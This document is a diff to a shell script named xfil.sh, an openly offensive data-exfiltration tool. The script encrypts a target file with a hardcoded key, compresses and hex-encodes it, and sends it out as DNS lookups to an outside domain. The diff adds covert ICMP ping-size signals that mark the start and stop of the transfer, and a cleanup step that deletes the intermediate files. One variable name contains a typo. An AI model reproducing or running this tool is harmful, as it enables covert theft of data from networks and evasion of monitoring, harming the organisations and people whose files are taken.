@@ -1,18 +1,61 @@
 #!/bin/sh
 
-# this should be ran from the exfil point
+svr=kbox.a.net  ## need to change this
 
-#!/bin/sh
+# send exfil start signal to server
+signal_exfil_start()
+{
+  ping -c 1 -s 78 $svr
+  sleep 1
+  ping -c 1 -s 57 $svr
+  sleep 1
+  ping -c 1 -s 88 $svra
+}
 
-usage (){
-  echo "USAGE: xfil.sh <file>"
+# send exfil stop signal to server
+signal_exfil_stop()
+{
+  ping -c 1 -s 128 $svr
+  sleep 1
+  ping -c 1 -s 118 $svr
+  sleep 1
+  ping -c 1 -s 138 $svr
+
+}
+
+send_exfil()
+{
+  echo signaling server for start...
+  signal_exfil_start
+  sleep 30 # a time delay to allow server time to receive exfil start signal
+
+    for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done
+  sleep 10 # a time delay for server
+  echo signaling server for stop
+  signal_exfil_stop	
+  echo exfil sent
+}
+
+cleanup()
+{
+  rm --interactive=never $1.tgz $1.1 $1.hex
+
+}
+
+usage () {
+  echo "USAGE: xfil.sh  <exfil file>"
   exit 1
 }
-if [ $1 ]; then	  
+
+#
+# MAIN
+#
+
+  if [ $1 ]; then
   openssl aes-256-cbc -in $1 -out $1.1 -k 1234
   tar -zcf $1.tgz $1.1
   xxd -p $1.tgz > $1.hex
-  for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done
-
+  send_exfil
+  cleanup
 else usage
 fi
